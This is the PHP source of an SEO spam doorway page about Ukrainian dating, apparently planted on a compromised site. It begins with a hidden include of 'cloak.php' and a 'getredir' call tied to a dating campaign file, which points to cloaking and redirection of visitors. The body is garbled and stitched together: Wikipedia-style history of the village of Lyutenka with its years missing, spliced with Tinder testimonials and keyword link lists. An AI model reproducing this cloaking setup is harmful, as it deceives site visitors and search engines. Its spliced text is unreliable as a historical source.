<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d1%87%d0%be%d1%80%d0%bd%d1%96+%d0%bf%d0%be%d0%b4%d1%96%d1%97+%d1%88%d0%b2%d0%b8%d0%b4%d0%ba%d1%96%d1%81%d0%bd%d0%b8%d1%85+%d0%b7%d0%bd%d0%b0%d0%b9%d0%be%d0%bc%d1%81%d1%82%d0%b2+%d0%bf%d0%be%d0%b1%d0%bb%d0%b8%d0%b7%d1%83+%d0%93%d0%b0%d0%b4%d1%8f%d1%87+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Чорні події швидкісних знайомств поблизу Гадяч Україна</title>
	<meta name="description" content="Лю́тенька — село в Україні, Гадяцькому районі Полтавської області. Герб сотенного містечка Лютенька Гадяцького полку прийнятий у році. містечко відвідав Даніел Крман і відобразив цю подію в «Подорожньому..." />
	<link rel="canonical" href="https://masage.od.ua/img/103/saxuk-chorn-pod.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/454/wyv-znayomstva-z-starshimi.php">знайомства зі старшими Первомайський Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/467/pot-znayomstva-logn-blyavka.php">знайомства логін Біляївка Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/103/xul-mo-shvidksn.php">мої швидкісні знайомства в Переяслав Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Чорні події швидкісних знайомств поблизу Гадяч Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>

		
			<br><ul>
			
				<li>Лютенька (село)!</li>
			
				<li>швидкісні знайомства християнина поблизу Соледар Україна?</li>
			
				<li>зона знайомств поблизу Українськ Україна;</li>
			
				<li>автоматичне підключення Тростянець Україна.</li>
			
				<li>Інтернет знайомства людина Новояворівськ Україна.</li>
			
				<li>популярні сайти знайомств в Ровеньки Україна;</li>
			
				<li>Навігаційне меню!</li>
			
			</ul>
		
	<p>На в'їзді в село зі сторони Гадяча розташований ставок Бали. До села прилягають великі лісові масиви сосна, дуб. За однією з версій назва села походить від прізвиська отамана Лютого, який заснував на цьому місці невелике укріплення, за іншою — в ознаменування запеклого лютого опору, що чинився прийшлим загарбникам місцевими жителями. Вірогідніша версія — від назви річки Лютеньки. Прапор Лютенської сотн і з року : полотнище малинового кольору, біля древка по вертикалі зеленого кольору Посередині золотий козацький хрест.</p><strong><a id='f1'></a><h2>Гортання праворуч</h2></strong><p>Герб сотенного містечка Лютенька Гадяцького полку прийнятий у році. Має вигляд воїнського щита зеленого кольору. Посередині щита золотий козацький хрест. Після вигнання денікінців 15 грудня року у Лютеньці був створений волосний ревком на чолі з І. Членами ревкому були Т. Козик і В. Місцеве населення чинило спротив радянській владі. Велика більшовицька армія потребувала продовольства, кінну тягову силу та ін.</p><strong><a id='f2'></a><h2>Лютенька (село) — Вікіпедія</h2></strong><p>Почалося тотальне пограбування селян під личиною «продразвьорсткі». Не очікуючи опору, більшовицькі загони сміливо заходили в селянські обійстя, де забирали все, що траплялось на очі. За спогадами лютеньчанина Марка Бездудного, у подальшому активного учасника повстанського загону під проводом Леонтія Христового, лютеньчани призначали спостерігача на високу дзвіницю Успенської церкви і коли він бачив валку з більшовицькими підводами, то калатав у дзвони на сполох і майже все доросле населення містечка бігло на край села: чоловіки з косами і жінки з ціпами відбивали просування загарбників.</p>
<p>Більшовики розуміли, що малими силами у селян нічого не забереш. І почали нарощувати свої сили, військову присутність в райнах грабунку.</p><strong><a id='f3'></a><h2>20 заяложених фраз з сайтів знайомств</h2></strong><p>У відповідь вибухнуло велике козацько-селянське повстання на чолі якого став Христовий Леонтій Остапович. Улітку року в урочищі Загатка повстанці розстріляли більшовицький продзагін в кількості 40 солдат, який йшов у Лютеньку для грабунку селян. Христового спільно з повстанцями отаманів Масюти і Мандика вели бій із ю армією більшовиків поблизу села Лютеньки. Спочатку повстанці знищили червоних розвідників, коли ті підійшли до Лютеньки і помічені зчинили стрілянину. За дві години червоні частини пішли у наступ.</p>
<p>Наступ повторювався кілька разів протягом дня. Ранок 22 липня у Лютеньці розпочався гарматним обстрілом з позицій червоних.</p>
		
			<br><ul>
			
				<li>Intercity onboard magazine липень-серпень/ by ICOM - Issuu;</li>
			
				<li>Тіндер | Знайомся, зустрічайся та знаходь нових друзів?</li>
			
				<li>м. служби знайомств місто в Горлівка Україна;</li>
			
				<li>знайомства навколо поблизу Рубіжне Україна.</li>
			
				<li>?</li>
			
				<li>.</li>
			
				<li>фотографії знайомств у Коростишів Україна?</li>
			
			</ul>
		
	<p>Розпочався наступ більшовиків. Від натиску більших сил більшовиків повстанці зазнали поразки. Масюта загинув. Більшовики мордували жителів містечка — тих, хто вцілів після бою. У результаті бою повстанці відступили, село було спалене більшовиками. Під час штурму Лютеньки в результаті вуличних боїв загинуло більше повстанців і мирних жителів села.</p>
<p>Сотні жінок, дітей та літніх людей, рятуючись від розправи, втекли до лісу.</p><a id='f4'></a><h3>"Люблю сміятися"</h3><p>Залишену в селянських обійстях худобу конфіскували на користь радянської влади. Повстанці відійшли за річку Лютенька в напрямку Бірок і укріпилися в лісі. Такого руйнуваня і таких жертв Лютенька не зазнавала з року, коли містечко сплюндрували орди татар Карачбея. Свідчення Андрієвського Віктора Никаноровича :. В Лютенці було спалено близько обійсть. Жертв ніхто не рахував, вцілілі мешканці містечка довго ховалися в лісах доки Лютеньку не покинув останній окупант.</p>
<p>За іронією долі, 7-ма Володимирська дивізія у вересні року була повністю розбита в Київському котлі, а командир дивізії Голіков Алєксандр Грігор'євіч, комісар Рогальов Фьодор Фьодоровіч, начальник агентури особового відділу Корніс Роберт Пєтровіч були арештовані органами НКВС в році та розстріляні. Зберігся архівний документ, акт розстрілу більшовиками заручників із числа цивільних мешканців Лютеньки за  Були розтріляні Савченко Микита Павлович, Скаженик, Яременко Макар, Хлопко Григорій, Бойко Гаврило, Кацюба Парфентій, Мищенко Филимон, Дворник Данило.</p>
		
	<p>До смертної кари була засудженна і Бойко Катерина, але її вдалося зникнути зі свого будинку до арешту. Період нацистської окупації тривав з  по  В той самий час почалося закладання баз для партизанського загону на території Лютенського та Безвіднянського лісництва.</p>
<p>Копёнкіна атакував гарнізон, у результаті операції гарнізон був частково знищений, партизани спалили склад з пальним, склад з продовольством для німецької армії, 3 автомашини і 1 мотоцикл. Близько мирних жителів було розстріляно під час каральних операцій у відповідь на дії партизан. За час окупації із території села було насильно вивезено мирних жителів на трудові роботи остарбайтерів.</p>
<p>Звільнена Лютенька була 11 вересня року. Важливу роль в придушенні запеклих контрударів противника в Гадяцькому районі зіграла введена в бій з резерву ставки Головного військового командування я армія під командуванням генерал-лейтенанта П. Корзуна і та стрілецька дивізія, бійцям якої в селі споруджено обеліск Слави. Всього загинуло і було поранено близько солдат дивізії. Після визволення села, силами червоної армії місцеві жителі не чинили спротиву радянській владі.</p>
<p>Всього за час війни з Лютеньки в Радянську армію було призвано більше її мешканців, загинуло, пропало безвісти більше осіб. Цивільних мешканців села загинуло близько  Відразу після встановлення Радянської влади в селі розпочалася колективізація.</p>
		
			
				<div>Знайомства онлайн у Німеччині: віртуальність та реальність - DW Ukrainian</div>
				<div><iframe width='560' height='315' src='https://www.youtube.com/embed/9XpcPWjVBD8' frameborder='0' allowfullscreen></iframe></div>
			
		
	<p>Не довіряючи місцевому населенню, на посаду голови сільської більшовики прислали Юрко Захара Гнатовича. Як розповідали потім старожили села, Юрко, намагаючись догодити Радянській владі, показати свою відданості її у великі релігійній свята відправляв підводи з візниками під церкви і всіх хто виходив з церкви хапали, і відправляли на роботи на колгоспне поле. Але надалі це не спасло його, він був арештований в році і розстріляний органами НКВС «как враг народа».</p><a id='f5'></a><h3>"Я тут новачок, але вирішив ризикнути…"</h3><p>Місцеве населення чинило спротив, не бажало добровільно вступати в колгоспи. У відповідь на це влада СРСР застосувала репресії щодо мирних жителів, шляхом ув'язнення, каторги та фізичної розправи. Сили були нерівні, адже частина населення яка могла чинити активний, симетричний спротив окупаційній владі загинула в двадцятих роках, а решта тікаючи від переслідування переселилася в віддалені краї.</p>
<p>Переломним моментом став голодомор — рр. Очевидці стверджують про акти канібалізму під час голодомору. Населенню було оголошено: «Хто не хоче виходити на роботу в новостворені колгоспи, ті особи позбавляються корови, а коли такої немає, підлягають покаранню» Бригади «буксирів» здебільшого складалися із місцевих мешканців, вихідців із нижчих верств населення та криміналітету.</p>
<p>Керували ними так звані тисячники — Золотарьов з Ленінграду та Фіялов з Дніпропетровську. Перший лютенчанам запам'ятався тим, що ходив по хатах і пиячив, якщо господарі відмовляли йому і його помічникам в гостинності то на другий день цього господаря «розкуркулювали», а сім'ю відправляли в Сибір , а другий запам'ятався тим, що нічого не петрав в сільському господарстві і коли він посилав звіт в район, то писав: «грєчіху викопалі, картофєль покосілі».</p>
<p>Після занесення Лютеньки на республіканську «Чорну дошку», для допомоги «буксирам» до Лютеньки прибуло до робітників з Києва , Харкова , Полтави , Гадяча. Для зручності грабунку село «буксири» поділили на десятки і сотні. Багате природними ресурсами і працьовитими людьми село почало вимирати. Через тиждень спілкування ми вирішили зустрітися в місцевому барі… і 27 червня року у нас відбулася невеличка весільна церемонія на 18 осіб. Ми зустрічались кілька місяців, а потім вирішили розійтися, оскільки не могли зрозуміти, куди все це йде.</p>
<p>Я була закохана, але не думала, що ці стосунки серйозні. Минуло 9 місяців, і тепер ми нерозлучні. Він почав розмову з НАЙГІРШОЇ фрази, яку взагалі можна придумати. Але я нудьгувала на роботі, тому вирішила відповісти. З тієї миті ми не припиняли спілкуватися, ходити на побачення і все більше закохуватися одне в одного. Хочу звернутися до усіх одинаків, особливо таких інтровертів як я: не бійтеся вийти з зони комфорту!</p>
<p>Саме так можна знайти справжні стосунки. Tinder познайомив нас, і я безмежно за це вдячна. Я категорично заявила собі, що наступний чоловік, з яким я буду зустрічатися, буде чоловік, з яким я проведу решту свого життя навіть якщо ми не одружимося. Я була скептично налаштована і не сподівалася зустріти когось в Tinder. Але все ж таки вирішила зареєструватися і спробувати. В університеті ми з сусідкою по кімнаті полюбляли посидіти в Тіндері — не шукали ні серйозних стосунків ані зустрічей на ніч , просто розважалися. Ми з моїм чоловіком познайомились у Tinder. Я взагалі не думав, що з цього щось вийде, але одного разу я побачив цю красуню в застосунку.</p>
<p>Вподобав її, заплативши додатковий долар за Супер-лайк! На той час я тільки-но завершила стосунки, а Енні щойно почала зустрічатися з дівчатами, тож спочатку ми трохи нервували. Але ми швидко закохалися і зрозуміли, що знайшли одне одну.</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/327/ceq-sayti-znayomstv-poblizu.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/137/bowu-mstsev-znayomstva-novomirgorod.php">місцеві знайомства Новомиргород Україна</a></li><li><a href="https://masage.od.ua/img/248/him-pdklyuchennya-dati-sokal.php">підключення дати Сокаль Україна</a></li><li><a href="https://masage.od.ua/img/406/wuxa-shvidksn-znayomstva-na.php">швидкісні знайомства на Жовті Води Україна</a></li><li><a href="https://masage.od.ua/img/352/lix-fotograf-znayomstv-v.php">фотографії знайомств в Інтернеті Гайворон Україна</a></li><li><a href="https://masage.od.ua/img/266/wybok-talya-znayomstva.php">Італія знайомства в Кременчук Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Articles</h2>
				<ol><li><a href='#f1'>Гортання праворуч</a></li>
<li><a href='#f2'>Лютенька (село) — Вікіпедія</a></li>
<li><a href='#f3'>20 заяложених фраз з сайтів знайомств</a></li>
<li><a href='#f4'>"Люблю сміятися"</a></li>
<li><a href='#f5'>"Я тут новачок, але вирішив ризикнути…"</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/280/nocar-msto-onlayn-znayomstva.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>